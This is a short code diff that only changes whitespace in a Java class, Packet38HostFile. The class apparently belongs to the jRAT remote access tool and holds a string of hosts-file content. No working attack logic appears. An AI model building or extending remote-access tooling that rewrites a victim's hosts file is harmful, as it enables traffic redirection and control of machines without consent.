@@ -4,11 +4,10 @@ import java.io.DataOutputStream;
 
 import pro.jrat.common.io.StringWriter;
 
-
 public class Packet38HostFile extends AbstractOutgoingPacket {
-	
+
 	private String content;
-	
+
 	public Packet38HostFile(String content) {
 		this.content = content;
 	}
